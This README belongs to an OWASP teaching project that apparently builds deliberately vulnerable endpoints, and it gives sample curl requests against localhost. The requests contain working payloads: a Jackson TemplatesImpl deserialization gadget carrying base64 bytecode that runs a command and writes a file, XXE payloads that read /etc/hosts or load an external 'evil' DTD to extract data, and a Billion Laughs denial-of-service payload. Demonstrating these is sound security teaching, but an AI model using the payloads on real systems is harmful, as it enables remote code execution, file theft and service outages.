# doku-owasp-example
Created as a documentation example for OWASP.

## Goals
- N/A

## More Info
- Hash Dictionary & Rainbow Table Sample: https://docs.google.com/spreadsheets/d/1jDzGolXZOao00sE-o_mOM0xOnlA4l78YVkP-zr0gyQM/edit?usp=sharing

## Sample cURL
1. InsecureDeserializationController.simulateOnJacksonObjectMapper
   ```
   curl --location 'http://localhost:8080/doku-owasp-example/insecure-deserialization/simulate-on-jackson-object-mapper' \
   --header 'Content-Type: application/json' \
   --data '{
       "umur": 25,
       "name": [
           "org.apache.xalan.xsltc.trax.TemplatesImpl",
           {
               "transletBytecodes": [
                   "yv66vgAAAD0AwAoAAgADBwAEDAAFAAYBAC9vcmcvYXBhY2hlL3hhbGFuL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEABjxpbml0PgEAAygpVgcACAEAEGphdmEvbGFuZy9TdHJpbmcIAAoBAAR2YXIxCQAMAA0HAA4MAA8AEAEAQmNvbS9kb2t1L2Rva3Vfb3dhc3BfZXhhbXBsZS9pbnNlY3VyZV9kZXNlcmlhbGl6YXRpb24vbW9kZWwvRXhwbG9pdAEACm5hbWVzQXJyYXkBABNbTGphdmEvbGFuZy9TdHJpbmc7CgASABMHABQMABUAFgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgAGAEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAKABIAGgwAGwAcAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAHgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyCgAdAAMHACEBAAxqYXZhL25ldC9VUkwIACMBAB9odHRwczovL3d3dy5nb29nbGUuY29tP3E9dGVzdC0xCgAgACUMAAUAJgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAIAAoDAApACoBAA5vcGVuQ29ubmVjdGlvbgEAGigpTGphdmEvbmV0L1VSTENvbm5lY3Rpb247BwAsAQAaamF2YS9uZXQvSHR0cFVSTENvbm5lY3Rpb24IAC4BAANHRVQKACsAMAwAMQAmAQAQc2V0UmVxdWVzdE1ldGhvZAcAMwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIHADUBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyCgArADcMADgAOQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKADQAOwwABQA8AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCgAyAD4MAAUAPwEAEyhMamF2YS9pby9SZWFkZXI7KVYKADIAQQwAQgBDAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAHQBFDABGAEcBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsJAEkASgcASwwATABNAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOxIAAABPDABQAFEBABdtYWtlQ29uY2F0V2l0aENvbnN0YW50cwEALShMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwoAUwBUBwBVDABWACYBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgoAMgBYDABZAAYBAAVjbG9zZQcAWwEAE2phdmEvbGFuZy9FeGNlcHRpb24KAFoAXQwAXgAGAQAPcHJpbnRTdGFja1RyYWNlBwBgAQAMamF2YS9pby9GaWxlCABiAQAzL1VzZXJzL2RhbmllbC9Eb3dubG9hZHMvZXhwbG9pdC1kdW1teS1kZWxldGUtbWUudHh0CgBfACUKAF8AZQwAZgBnAQANY3JlYXRlTmV3RmlsZQEAAygpWgcAaQEAFmphdmEvaW8vQnVmZmVyZWRXcml0ZXIHAGsBABpqYXZhL2lvL091dHB1dFN0cmVhbVdyaXRlcgcAbQEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQoAbABvDAAFAHABABEoTGphdmEvaW8vRmlsZTspVgoAagByDAAFAHMBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWCgBoAHUMAAUAdgEAEyhMamF2YS9pby9Xcml0ZXI7KVYIAHgBAAxleHBsb2l0LWNvZGUKAGgAegwAewAmAQAFd3JpdGUKAGgAfQwAfgAGAQAHbmV3TGluZQoAaACADACBAAYBAAVmbHVzaAoAaABYBwCEAQATamF2YS9sYW5nL1Rocm93YWJsZQoAgwCGDACHAIgBAA1hZGRTdXBwcmVzc2VkAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABnJlc3VsdAEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAN1cmwBAA5MamF2YS9uZXQvVVJMOwEABGNvbm4BABxMamF2YS9uZXQvSHR0cFVSTENvbm5lY3Rpb247AQACcmQBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQACZXgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJidwEAGExqYXZhL2lvL0J1ZmZlcmVkV3JpdGVyOwEABGZpbGUBAA5MamF2YS9pby9GaWxlOwEABHRoaXMBAERMY29tL2Rva3UvZG9rdV9vd2FzcF9leGFtcGxlL2luc2VjdXJlX2Rlc2VyaWFsaXphdGlvbi9tb2RlbC9FeHBsb2l0OwEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zAQAJdHJhbnNmb3JtAQBzKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAcTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NOwEACGl0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAMExvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAqQEAKG9yZy9hcGFjaGUveGFsYW4veHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBNZXRob2RQYXJhbWV0ZXJzAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAANkb20BABVzZXJpYWxpemF0aW9uSGFuZGxlcnMBADFbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEV4cGxvaXQuamF2YQEAEEJvb3RzdHJhcE1ldGhvZHMPBgCzCgC0ALUHALYMAFAAtwEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7CAC5AQASU2VydmVyIFJlc3BvbnNlOiABAQAMSW5uZXJDbGFzc2VzBwC8AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAcAvgEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwEABkxvb2t1cAAhAAwAAgAAAAAAAwABAAUABgACAIkAAAJCAAcABgAAANIqtwABKgS9AAdZAxIJU7UAC7gAERIXtgAZV7sAHVm3AB9MuwAgWRIitwAkTSy2ACfAACtOLRIttgAvuwAyWbsANFkttgA2twA6twA9OgQZBLYAQFk6BcYADSsZBbYARFen/+6yAEgrugBOAAC2AFIZBLYAV6cACEwrtgBcuwBfWRJhtwBjTCu2AGRXuwBoWbsAalm7AGxZK7cAbrcAcbcAdE0sEne2AHkstgB8LLYAfyy2AIKnABVOLLYAgqcACzoELRkEtgCFLb+nAAhMK7YAXLEABAAaAHQAdwBaAKIAsAC3AIMAuAC8AL8AgwB8AMkAzABaAAMAigAAAG4AGwAAABcABAAYABEAGwAaACAAIgAiACwAIwA0ACQAOgAlAE4AJwBZACkAYwArAG8ALAB0ADAAdwAtAHgALwB8ADUAhgA2AIsAOACiADoAqAA7AKwAPACwAD0AtwA4AMkAQQDMAD4AzQBAANEAQgCLAAAAZgAKACIAUgCMAI0AAQAsAEgAjgCPAAIANABAAJAAkQADAE4AJgCSAJMABABWAB4AlACVAAUAeAAEAJYAlwABAKIAJwCYAJkAAgCGAEMAmgCbAAEAzQAEAJYAlwABAAAA0gCcAJ0AAACeAAAAXgAK/wBOAAUHAAwHAB0HACAHACsHADIAAPwAFAcAB/8AEwABBwAMAAEHAFoE/wA6AAMHAAwHAF8HAGgAAQcAg/8ABwAEBwAMBwBfBwBoBwCDAAEHAIMH+AABQgcAWgQAnwAAAAQAAQBaAAEAoAChAAMAiQAAAEkAAAAEAAAAAbEAAAACAIoAAAAGAAEAAABHAIsAAAAqAAQAAAABAJwAnQAAAAAAAQCiAKMAAQAAAAEApAClAAIAAAABAKYApwADAJ8AAAAEAAEAqACqAAAADQMAogAAAKQAAACmAAAAAQCgAKsAAwCJAAAAPwAAAAMAAAABsQAAAAIAigAAAAYAAQAAAEwAiwAAACAAAwAAAAEAnACdAAAAAAABAKwAowABAAAAAQCtAK4AAgCfAAAABAABAKgAqgAAAAkCAKwAAACtAAAAAwCvAAAAAgCwALEAAAAIAAEAsgABALgAugAAAAoAAQC7AL0AvwAZ"
               ],
               "transletName": "foo",
               "outputProperties": {}
           }
       ]
   }'
   ```
2. XxeSimulatorController.simulateOnJacksonXmlMapper
   ```
   curl --location 'http://localhost:8080/doku-owasp-example/xxe/simulate-on-jackson-xml-mapper' \
   --header 'Content-Type: application/xml' \
   --data '<?xml version="1.0" encoding="utf-8"?>
   <!DOCTYPE test [
       <!ENTITY xxe SYSTEM "file:///etc/hosts">
       <!ENTITY footer "Copyleft by djph-inc.com!">
   ]>
   <note>
       <to>&xxe;</to>
       <from>Daniel</from>
       <heading>Reminder</heading>
       <body>Don'\''t forget me this weekend!</body>
       <footer>&footer;</footer>
   </note>'
   ```
3. XxeSimulatorController.simulateOnJacksonXmlMapper (Billion Laughs Attack)
   ```
   curl --location 'http://localhost:8080/doku-owasp-example/xxe/simulate-on-jackson-xml-mapper' \
   --header 'Content-Type: application/xml' \
   --data '<?xml version="1.0" encoding="utf-8"?>
   <!DOCTYPE test [
       <!ENTITY lol "lol">
       <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
       <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
       <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
       <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
       <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
       <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
       <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
       <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
       <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
       <!ENTITY lol11 "&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;">
       <!ENTITY lol12 "&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;">
       <!ENTITY footer "Copyleft by djph-inc.com!">
   ]>
   <note>
       <to>&lol12;</to>
       <from>Daniel</from>
       <heading>Reminder</heading>
       <body>Don'\''t forget me this weekend!</body>
       <footer>&footer;</footer>
   </note>'
   ```
4. XxeSimulatorController.simulateOnJavaxXml (Extract data from server and upload it.)
   ```
   curl --location 'http://localhost:8080/doku-owasp-example/xxe/simulate-on-javax-xml' \
   --header 'Content-Type: application/xml' \
   --data '<?xml version="1.0" encoding="utf-8"?>
   <!DOCTYPE test [
       <!ENTITY % external_dtd SYSTEM "http://127.0.0.1:8080/doku-owasp-example/evil-external-dtd.xml">
       %external_dtd;
       <!ENTITY footer "Copyleft by djph-inc.com!">
   ]>
   <note>
       <to>Joi</to>
       <from>Daniel</from>
       <heading>Reminder</heading>
       <body>Don'\''t forget me this weekend!</body>
       <footer>&footer;</footer>
   </note>'
   ```
5. XxeSimulatorController.simulateApachePoiVulnerability
   ```
   curl --location 'http://localhost:8080/doku-owasp-example/xxe/simulate-apache-poi-vulnerability' \
   --form 'file=@"/Users/daniel/Downloads/Test-XXE-Malicious.xlsx"'
   ```
